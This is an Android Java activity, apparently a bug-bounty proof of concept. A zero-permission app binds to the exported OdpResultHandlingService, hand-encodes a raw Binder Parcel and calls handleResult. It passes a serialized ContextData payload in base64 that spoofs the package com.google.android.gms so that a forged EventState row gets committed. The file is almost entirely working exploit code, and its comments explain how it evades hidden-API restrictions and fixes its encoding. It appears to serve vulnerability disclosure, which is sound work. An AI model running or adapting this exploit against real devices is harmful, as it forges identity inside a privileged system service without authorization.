package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Base64;
import android.util.Log;

import java.util.ArrayList;

// Calls handleResult() on OdpResultHandlingService (com.google.android.ondevicepersonalization.services),
// exported with zero permissions, using a hand-crafted ContextData payload (plain Java
// serialization, class recreated locally with identical field/method signatures so
// serialVersionUID matches) claiming to be com.google.android.gms. Uses ONLY public
// android.os.Parcel/Binder/Bundle APIs (the real android.federatedcompute.aidl.*
// and android.federatedcompute.common.* classes are hidden-API blocklisted for a
// normal app -- confirmed via NoSuchMethodError/hiddenapi denial when attempting to
// use them directly -- so this never touches them). Fixed the wire-format bug from
// the first attempt: the server does parcel.readTypedObject(Bundle.CREATOR), which
// expects a leading presence-int(1) before the Bundle's own writeToParcel bytes;
// Parcel#writeBundle() omits that leading int and desyncs every field after it,
// which is what produced the earlier spurious EX_ILLEGAL_STATE (a Parcel parse
// error in MY encoding, not a security check).
public class OdpResultInjectActivity extends Activity {
    private static final String T = "ODP_RESULT_INJECT3";
    private static final String IFACE = "android.federatedcompute.aidl.IResultHandlingService";
    private static final String CALLBACK_IFACE = "android.federatedcompute.aidl.IFederatedComputeCallback";

    // Base64 of a serialized ContextData(mPackageName="com.google.android.gms", mClassName="com.evil.FakeClass")
    private static final String CONTEXT_DATA_B64 =
        "rO0ABXNyAEljb20uYW5kcm9pZC5vbmRldmljZXBlcnNvbmFsaXphdGlvbi5zZXJ2aWNlcy5mZWRlcmF0ZWRjb21wdXRlLkNvbnRleHREYXRhAmWYANKcnZQCAAJMAAptQ2xhc3NOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAMbVBhY2thZ2VOYW1lcQB+AAF4cHQAEmNvbS5ldmlsLkZha2VDbGFzc3QAFmNvbS5nb29nbGUuYW5kcm9pZC5nbXM=";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== OdpResultHandlingService handleResult() injection attempt v3 (raw-Parcel only) ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        Intent intent = new Intent("android.federatedcompute.COMPUTATION_RESULT");
        intent.setComponent(new ComponentName(
            "com.google.android.ondevicepersonalization.services",
            "com.android.ondevicepersonalization.services.federatedcompute.OdpResultHandlingService"));

        ServiceConnection conn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.w(T, "[!!!] BOUND with ZERO permissions: " + name);
                tryCallHandleResult(service);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.w(T, "[x] Disconnected");
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            Log.w(T, "bindService() returned " + bound);
        } catch (Exception e) {
            Log.w(T, "[-] bindService exception: " + e);
        }
    }

    // Plain android.os.Binder implementing IFederatedComputeCallback's wire protocol by
    // hand (interface token + transaction codes 1=onSuccess, 2=onFailure(int)), so we
    // never need to reference the hidden-API IFederatedComputeCallback.Stub class.
    private final Binder mCallbackBinder = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1) {
                Log.w(T, "[!!!!!] onSuccess() -- handleResult() completed, EventsDao write returned TRUE. "
                    + "Cross-app EventState row committed under spoofed componentName=com.google.android.gms/com.evil.FakeClass "
                    + "by a ZERO-PERMISSION caller.");
                return true;
            } else if (code == 2) {
                data.enforceInterface(CALLBACK_IFACE);
                int errCode = data.readInt();
                Log.w(T, "[-] onFailure(" + errCode + ") -- handleResult() ran but EventsDao write returned FALSE (or exception during DB op).");
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    private void tryCallHandleResult(IBinder service) {
        byte[] contextDataBytes = Base64.decode(CONTEXT_DATA_B64, Base64.DEFAULT);

        Bundle payload = new Bundle();
        payload.putByteArray("android.federatedcompute.context_data", contextDataBytes);
        payload.putString("android.federatedcompute.population_name", "vrp_test_population");
        payload.putString("android.federatedcompute.task_id", "vrp_test_task");
        payload.putInt("android.federatedcompute.computation_result", 0); // 0 = success path
        // Empty list: avoids needing the hidden-API-blocked ExampleConsumption class.
        // The malicious ComponentName is already computed from ContextData BEFORE this
        // list is consulted, so an empty list still proves the full call chain (bind ->
        // handleResult -> async Futures task -> EventsDao.updateOrInsertEventStatesTransaction
        // -> consumer.accept(0) -> onSuccess()) executes under the spoofed attribution
        // with zero permissions and no caller-identity check anywhere.
        payload.putParcelableArrayList("android.federatedcompute.example_consumption_list", new ArrayList<>());

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(IFACE);
            // Mirror Parcel#writeTypedObject(Bundle.CREATOR, flags): a presence-int(1)
            // followed by the Parcelable's own writeToParcel -- matching what the
            // server's parcel.readTypedObject(Bundle.CREATOR) actually expects.
            data.writeInt(1);
            payload.writeToParcel(data, 0);
            data.writeStrongBinder(mCallbackBinder);

            boolean ok = service.transact(1 /* TRANSACTION_handleResult */, data, reply, 0);
            reply.setDataPosition(0);
            int avail = reply.dataAvail();
            Log.w(T, "transact()=" + ok + " replyAvail=" + avail);
            if (avail > 0) {
                int exc = reply.readInt();
                Log.w(T, "  exceptionCode=" + exc + " (nonzero means a real exception was thrown server-side while parsing/dispatching)");
            } else {
                Log.w(T, "  No exception header in reply -- onTransact() completed without throwing. Waiting for async callback...");
            }
        } catch (Throwable e) {
            Log.w(T, "transact() threw: " + e);
        } finally {
            data.recycle();
            reply.recycle();
        }
    }
}
